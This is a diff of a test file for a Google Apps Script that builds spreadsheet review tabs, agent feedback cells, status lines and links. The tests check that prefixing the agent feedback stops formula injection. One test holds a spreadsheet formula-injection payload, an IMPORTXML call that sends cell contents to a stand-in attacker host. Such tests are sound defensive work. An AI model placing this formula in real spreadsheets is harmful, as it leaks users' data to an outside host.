@@ -236,7 +236,7 @@ describe("review-sheet.gs, built and run against a fake sheet", () => {
 
   test("RCS joins its comments, each No. n linking to its RPC row, status bold", () => {
     const c = rcs["Public Comments"][0][0] as Rich;
-    expect(c.text).toBe("No. 1 (Pending) · Too short\n\nNo. 2 · Typo");
+    expect(c.text).toBe("No. 1 (Pending) · Too short\nNo. 2 · Typo");
     expect(c.links.map((l) => [slice(c, l), l[2]])).toEqual([["No. 1", "#gid=1&range=A2"], ["No. 2", "#gid=1&range=A3"]]);
     expect(c.bold.map(([a, z]) => c.text.slice(a, z))).toEqual(["(Pending)"]);
     expect((rcs["Suggested Revisions"][0][0] as Rich).text).toBe("No. 1 · Lengthen it");
@@ -492,7 +492,7 @@ describe("review-sheet.gs in drafting mode", () => {
 
   test("each tab's Instructions say how that tab works, in the sheet's own words, and the Config tab's are short rows", () => {
     expect(dRows.slice(0, 5).map((r) => r[0])).toEqual(["Instructions", "Instructions - Install script", "Instructions - Dropdown", "Instructions - Editors", "Key"]);
-    expect(dRows[0][1]).toContain("only the owner edits");
+    expect(dRows[0][1]).toContain("EDITORS (owner only)");
     // Installing Code.gs, step by step, with the project named after the sheet (owner, 2026-10-31).
     expect(dRows[1][1]).toMatch(/Extensions, then Apps Script[\s\S]*Name the project after this sheet[\s\S]*Libraries[\s\S]*HEAD[\s\S]*Review[\s\S]*Advanced/);
     expect(dRows[1][1]).toContain("Google hasn't verified this app. The app is requesting access to sensitive info in your Google Account.");
@@ -506,9 +506,9 @@ describe("review-sheet.gs in drafting mode", () => {
     expect(configRows(buildConfig(folio(), "review/public-comment/sheet-sync.json")).map((r) => r[0])).not.toContain("Instructions - Dropdown");
     const d = tabInstructions(buildConfig(draftFolio(), "review/drafting/sheet-sync.json"));
     const cf = d["Contributor Feedback"];
-    expect(cf).toContain("Column colours:     your input, by the Authoring Committee");
-    expect(cf).toContain("sets Ready for agent back to No");
-    expect(cf).toContain("Reviewers update Contributor Feedback.");
+    expect(cf).toContain("Column colours:     the Authoring Committee     the agent");
+    expect(cf).toContain("resets Ready for agent to No");
+    expect(cf).toContain("New Contributor Feedback marks the proposal stale");
     expect(cf).toContain("Filter views");
     // No colour is named: the script colours the column names (owner, 2026-11-01).
     for (const t of [...Object.values(d), ...Object.values(tabInstructions(buildConfig(folio(), "review/public-comment/sheet-sync.json")))]) {
@@ -516,8 +516,8 @@ describe("review-sheet.gs in drafting mode", () => {
     }
     expect(cf).toContain("/en/cat-harness/processes/contributor-feedback.html");
     const p = tabInstructions(buildConfig(folio(), "review/public-comment/sheet-sync.json"));
-    expect(p["Review Public Comments"]).toContain("one row per public comment");
-    expect(p["Review Change Sets"]).toContain("one row per change set");
+    expect(p["Review Public Comments"]).toContain("One row per public comment");
+    expect(p["Review Change Sets"]).toContain("One row per change set");
     expect(p["Review Change Sets"]).toContain("/en/cat-harness/processes/public-comment.html");
     expect(Object.values(p).join("\n")).not.toMatch(/architect/i);
     expect(configRows(buildConfig(folio(), "review/public-comment/sheet-sync.json"))[1][1]).not.toContain("Allow multiple selections");
@@ -699,15 +699,15 @@ describe("review-sheet.gs in drafting mode", () => {
     const rt2 = runtime(t);
     const s = load(code, rt2.g);
     s.refreshAll();
-    expect(T(rt2.written["Contributor Feedback"]["Contributor Feedback (agent)"][0][0])).toBe("\u23f3 dth#40 open, updated 2026-10-30 23:40Z; preview current.\nDefine it in 1.1");
+    expect(T(rt2.written["Contributor Feedback"]["Contributor Feedback (agent)"][0][0])).toBe("\u23f3 dth#40 open, updated 2026-10-30 23:40Z; preview current.\n\u21b3 Where to review (preview): Ch 1 Why it matters \u00b7 1.1 Global challenges\nDefine it in 1.1");
     f[1][1] = "Define registry and register";
     s.refreshAll();
     const stale = T(rt2.written["Contributor Feedback"]["Contributor Feedback (agent)"][0][0]) as string;
-    expect(stale).toMatch(/^\u26a0 Stale: .*\n\u23f3 dth#40 open, updated 2026-10-30 23:40Z; preview current\.\nDefine it in 1\.1$/);
+    expect(stale).toMatch(/^\u26a0 Stale: .*\n\u23f3 dth#40 open, updated 2026-10-30 23:40Z; preview current\.\n\u21b3 Where to review.*\nDefine it in 1\.1$/);
     f[1][1] = "Define registry";
     f[1][9] = stale;
     s.refreshAll();
-    expect(T(rt2.written["Contributor Feedback"]["Contributor Feedback (agent)"][0][0])).toBe("\u23f3 dth#40 open, updated 2026-10-30 23:40Z; preview current.\nDefine it in 1.1");
+    expect(T(rt2.written["Contributor Feedback"]["Contributor Feedback (agent)"][0][0])).toBe("\u23f3 dth#40 open, updated 2026-10-30 23:40Z; preview current.\n\u21b3 Where to review (preview): Ch 1 Why it matters \u00b7 1.1 Global challenges\nDefine it in 1.1");
   });
 
   test("the agent column under its new name, Feedback (agent), is read the same, and never counts as a person's feedback", () => {
@@ -724,7 +724,7 @@ describe("review-sheet.gs in drafting mode", () => {
     expect(String(T(rt2.written["Contributor Feedback"]["Feedback (agent)"][0][0]))).not.toMatch(/Stale/);
     f[1][1] = "A new title";
     s.refreshAll();
-    expect(String(T(rt2.written["Contributor Feedback"]["Feedback (agent)"][0][0]))).toMatch(/^\u26a0 Stale: .*\n\u23f3 .*\nQuestion for the editor/);
+    expect(String(T(rt2.written["Contributor Feedback"]["Feedback (agent)"][0][0]))).toMatch(/^\u26a0 Stale: .*\n\u23f3 .*\n\u21b3 Where to review.*\nQuestion for the editor/);
   });
 
   test("a new empty feedback column marks nothing stale, and a basis written the older way still matches", () => {
@@ -811,17 +811,17 @@ describe("review-sheet.gs in drafting mode", () => {
     t.Agent.rows[1][at("Staging built from (change set)")] = "1234567";
     t.Agent.rows[1][at("Staging deploy (change set)")] = "pending";
     s.refreshAll();
-    expect(text()).toBe("review \u26a0 stale, restaging: Pages is deploying it");
+    expect(text()).toBe("\u23f3 Preview not live yet: Pages is deploying it. The link appears when Pages has deployed it.");
     t.Agent.rows[1][at("Staging deploy (change set)")] = "deploying, expected 2026-10-31 15:20Z";
     s.refreshAll();
-    expect(text()).toBe("review \u26a0 stale, restaging: Pages is deploying it, expected live 2026-10-31 15:20Z");
+    expect(text()).toBe("\u23f3 Preview not live yet: Pages is deploying it, expected live 2026-10-31 15:20Z. The link appears when Pages has deployed it.");
     t.Agent.rows[1][at("Staging deploy (change set)")] = "pushed";
     s.refreshAll();
-    expect(text()).toBe("review \u26a0 stale, restaging: on gh-pages, waiting for Pages to deploy");
+    expect(text()).toBe("\u23f3 Preview not live yet: on gh-pages, waiting for Pages to deploy. The link appears when Pages has deployed it.");
     t.Agent.rows[1][at("Staging built from (change set)")] = "abcdef1";
     t.Agent.rows[1][at("Staging deploy (change set)")] = "building";
     s.refreshAll();
-    expect(text()).toBe("review \u26a0 stale: built from abcdef1, PR now at 1234567; restaging: building the preview");
+    expect(text()).toBe("\u23f3 Preview not live yet: building the preview. The link appears when Pages has deployed it.");
     t.Agent.rows[1][at("Staging built from (change set)")] = "1234567";
     t.Agent.rows[1][at("Staging deploy (change set)")] = "failed";
     s.refreshAll();
@@ -887,7 +887,7 @@ describe("review-sheet.gs in drafting mode", () => {
     load(code, rt2.g).refreshAll();
     const w = rt2.written["Contributor Feedback"];
     // The progress line now leads, so the cell cannot start as a formula.
-    expect(T(w["Contributor Feedback (agent)"][0][0])).toBe('\u23f3 dth#40 open, updated 2026-10-30 23:40Z; preview current.\n=IMPORTXML("https://evil.example/?"&A1,"//a")');
+    expect(T(w["Contributor Feedback (agent)"][0][0])).toBe('\u23f3 dth#40 open, updated 2026-10-30 23:40Z; preview current.\n\u21b3 Where to review (preview): Ch 1 Why it matters \u00b7 1.1 Global challenges\n=IMPORTXML("https://evil.example/?"&A1,"//a")');
     expect(String(w["Selected Sections"][1][0]).startsWith("'=")).toBe(true);
   });
 
@@ -1046,8 +1046,8 @@ describe("the colour key in Instructions text", () => {
   const words = runs.map(([a, z, c]) => [text.slice(a, z), c]);
 
   test("each key phrase on the first line is coloured whole, in key order, naming no colour", () => {
-    expect(words[0][0]).toBe("your input, by the Feedback Review Committee");
-    expect(words[1][0]).toBe("written by the agent");
+    expect(words[0][0]).toBe("the Feedback Review Committee");
+    expect(words[1][0]).toBe("the agent");
     expect(new Set(words.slice(0, 4).map(([, c]) => c)).size).toBe(4);
   });
 
@@ -1381,18 +1381,33 @@ describe("Needs human says what the person must do (owner, 2026-10-31)", () => {
   });
 });
 
-describe("Decision needed stands out in the agent's feedback (owner, 2026-10-31)", () => {
+describe("only the tags are bold in the agent's feedback (owner, 2026-11-01)", () => {
   const fns = new Function("SpreadsheetApp", `${code}\nreturn { decisionSpans };`)({}) as { decisionSpans: (t: string) => [number, number][] };
-  test("the block runs from Decision needed to the next blank line", () => {
+  const bold = (t: string) => fns.decisionSpans(t).map(([a, z]) => t.slice(a, z));
+  test("the Decision needed tag is bold, its question and options are not", () => {
     const t = "Proposed direction: x.\n\nDecision needed (No. 1): y?\nA. Yes\nB. No\n\nDecided (Q1): A.";
-    const [[a, z]] = fns.decisionSpans(t);
-    expect(t.slice(a, z)).toBe("Decision needed (No. 1): y?\nA. Yes\nB. No");
+    expect(bold(t)).toEqual(["Proposed direction:", "Decision needed (No. 1):", "Decided (Q1):", "No. 1"]);
   });
-  test("no block, no spans", () => {
-    expect(fns.decisionSpans("Decided (Q1): A.")).toEqual([]);
-    // The script's status line is bold as well, below a stale mark.
-    const st = "\u26a0 Stale: x\n\u23f3 r#1 open.\nProposal";
-    expect(fns.decisionSpans(st)).toEqual([[st.indexOf("\u23f3"), st.indexOf("\nProposal")]]);
+  test("the status line bolds its tag only", () => {
+    const st = "\u26a0 Stale: x\n\u23f3 Needs you: answer it.\nStatus: draft.\nNext: review it.";
+    expect(bold(st)).toEqual(["Stale:", "Needs you:", "Status:", "Next:"]);
+    expect(bold("\u23f3 r#1 open.\nProposal")).toEqual([]);
+    expect(bold("Decision needed: which?\nA. All 16 (recommended: none)\nB. None")).toEqual(["Decision needed:"]);
+  });
+});
+
+describe("the ask comes first in the agent's feedback (owner, 2026-11-01)", () => {
+  const fns = new Function("SpreadsheetApp", `${code}\nreturn { withProgress };`)({}) as { withProgress: (t: string, l: string) => string };
+  test("a bare proposal gets the review ask on top", () => {
+    expect(fns.withProgress("Proposed direction: accept.", "").split("\n")[0]).toMatch(/^\u23f3 Please review: do you agree with the proposed direction below\?/);
+  });
+  test("no Decision needed block, no Decision needed status line", () => {
+    const out = fns.withProgress("Status: draft PR r#1.", "\u23f3 Needs you: answer the Decision needed below, then set Ready for agent to Yes.");
+    expect(out).toBe("Status: draft PR r#1.");
+  });
+  test("a real Decision needed block keeps its status line", () => {
+    const l = "\u23f3 Needs you: answer the Decision needed below, then set Ready for agent to Yes.";
+    expect(fns.withProgress("Decision needed: which?\nA. x\nB. y", l).split("\n")[0]).toBe(l);
   });
 });
 
@@ -1720,5 +1735,106 @@ describe("the Selected Sections dropdown reminder (core#472)", () => {
     const body = src.slice(src.indexOf("function checkDropdown("), src.indexOf("function normalizeRows("));
     expect(body).toMatch(/console\.log\(msg\)/);
     expect(body).toMatch(/ss\.toast\(msg,/);
+  });
+});
+
+describe("Needs you only with a question (Q-FBK-1 A)", () => {
+  const fns = new Function("SpreadsheetApp", `${code}\nreturn { askChecked, statusBlock, progressLine };`)({}) as {
+    askChecked: (l: unknown, t: string) => any;
+    statusBlock: (l: string, s: string, p: object[]) => { text: string; links: [number, number, string][] };
+    progressLine: (o: object) => string;
+  };
+  const line = fns.progressLine({ status: "Needs human" });
+  test("keeps the line when the feedback holds a Decision needed block", () => {
+    expect(fns.askChecked(line, "Decision needed: which title?\nA. Short (recommended)\nB. Long")).toBe(line);
+  });
+  test("drops the Needs you line when there is no question", () => {
+    expect(fns.askChecked(line, "Draft PR dth-hrh#81: 6 BPMN processes.")).toBe("");
+  });
+  test("drops the Needs you sub-line and keeps the PR link on the right text", () => {
+    const url = "https://github.com/litlfred/dth-hrh/pull/81";
+    const b = fns.statusBlock(line, "Needs human", [{ url, done: "2026-11-01 19:00Z" }]);
+    const out = fns.askChecked(b, "no question here");
+    expect(out.text).not.toMatch(/answer the agent's question: under/);
+    const [a, z, u] = out.links[0];
+    expect(u).toBe(url);
+    expect(out.text.slice(a, z)).toBe("dth-hrh#81");
+  });
+});
+
+describe("Where to review and PR links (Q-FBK-3 A)", () => {
+  const fns = new Function("SpreadsheetApp", "CFG", `${code.replace(/^(const|let) CFG\b.*$/m, "")}\nreturn { whereLine, previewSection, autoLinks, withWhere };`)({}, { REPO_URL: "https://github.com/litlfred/dth-hrh" }) as any;
+  const toc = { "4.1 Scope": "https://litlfred.github.io/dth-hrh/en/dth-hrh/#sec-4-1" };
+  test("links each selected section on the preview while there is one", () => {
+    const w = fns.whereLine(["4.1 Scope"], toc, "https://litlfred.github.io/dth-hrh/STAGING/claude-x/en/review/");
+    expect(w.text).toBe("↳ Where to review (preview): 4.1 Scope");
+    expect(w.links[0][2]).toBe("https://litlfred.github.io/dth-hrh/STAGING/claude-x/en/dth-hrh/#sec-4-1");
+    expect(w.text.slice(w.links[0][0], w.links[0][1])).toBe("4.1 Scope");
+  });
+  test("falls back to the published draft, and flags no section", () => {
+    expect(fns.whereLine(["4.1 Scope"], toc, "").links[0][2]).toBe(toc["4.1 Scope"]);
+    expect(fns.whereLine([], toc, "").text).toMatch(/No section selected/);
+  });
+  test("every repo#n becomes a link", () => {
+    const t = "Draft PR dth-hrh#82 and smart-ra#198.";
+    const l = fns.autoLinks(t, []);
+    expect(l.map((x: any) => t.slice(x[0], x[1]))).toEqual(["dth-hrh#82", "smart-ra#198"]);
+    expect(l[0][2]).toBe("https://github.com/litlfred/dth-hrh/issues/82");
+  });
+});
+
+describe("a refresh keeps the links an agent put in its feedback (owner, 2026-11-01: \"Dont know where link is\")", () => {
+  const { keptLinks, linkRuns } = new Function("SpreadsheetApp", code + "\nreturn { keptLinks, linkRuns };")({}) as {
+    keptLinks: (r: { text: string; url: string }[], t: string) => [number, number, string][];
+    linkRuns: (range: object) => { text: string; url: string }[];
+  };
+  test("each linked label is found again in the new text, in order", () => {
+    const runs = [
+      { text: "dth-hrh#75", url: "https://github.com/litlfred/dth-hrh/pull/75" },
+      { text: "dth-hrh#75", url: "https://github.com/litlfred/dth-hrh/pull/75" },
+    ];
+    const t = "⏳ The agent is working on dth-hrh#69.\nStatus: plan dth-hrh#75 signed off.\nWhere to review: dth-hrh#75.";
+    const k = keptLinks(runs, t);
+    expect(k.map(([a, z]) => t.slice(a, z))).toEqual(["dth-hrh#75", "dth-hrh#75"]);
+    expect(k[0][0]).toBeLessThan(k[1][0]);
+  });
+  test("a label no longer in the text is dropped", () => {
+    expect(keptLinks([{ text: "gone", url: "https://x/" }], "new text")).toEqual([]);
+  });
+  test("a cell without rich text gives no runs", () => {
+    expect(linkRuns({})).toEqual([]);
+    expect(linkRuns({ getRichTextValue: () => { throw new Error("no"); } })).toEqual([]);
+    const run = (text: string, url: string | null) => ({ getText: () => text, getLinkUrl: () => url });
+    expect(linkRuns({ getRichTextValue: () => ({ getRuns: () => [run("a ", null), run("#75", "https://u/"), run(" ", "https://v/")] }) }))
+      .toEqual([{ text: "#75", url: "https://u/" }]);
+  });
+});
+
+describe("finished change sets are hidden and struck through", () => {
+  // Owner, 2026-11-01 21:50Z: "make sure complete changeset rows are hidden so
+  // not cluttered and that text of that whole row is crossed out".
+  const { finishDoneRows } = new Function(code + "\nreturn { finishDoneRows };")() as {
+    finishDoneRows: (s: object, csCol: number, stOf: Record<string, string>, props: object) => void;
+  };
+  const run = (stOf: Record<string, string>, store: Record<string, string> = {}) => {
+    const log: string[] = [];
+    const sh = {
+      getLastColumn: () => 5,
+      getRange: (row: number, _c: number, _n: number, w: number) => ({ setFontLine: (l: string) => log.push(`line ${row} ${w} ${l}`) }),
+      hideRows: (row: number) => log.push(`hide ${row}`),
+      showRows: (row: number) => log.push(`show ${row}`),
+    };
+    const props = { getProperty: (k: string) => store[k] ?? null, setProperty: (k: string, v: string) => { store[k] = v; } };
+    finishDoneRows({ sh, top: 3, rows: [["CS-001"], ["CS-002"], [""], ["CS-003"]] }, 0, stOf, props);
+    return { log, store };
+  };
+  test("Change merged and Closed rows are struck through across the row and hidden; others untouched", () => {
+    const { log, store } = run({ "CS-001": "Change merged", "CS-002": "PR open", "CS-003": "Closed" });
+    expect(log).toEqual(["line 3 5 line-through", "hide 3", "line 6 5 line-through", "hide 6"]);
+    expect(store).toEqual({ "d:CS-001": "1", "d:CS-003": "1" });
+  });
+  test("an unchanged row is not touched again, and a reopened row is shown with the line removed", () => {
+    const { log } = run({ "CS-001": "Change merged", "CS-003": "Working" }, { "d:CS-001": "1", "d:CS-003": "1" });
+    expect(log).toEqual(["line 6 5 none", "show 6"]);
   });
 });
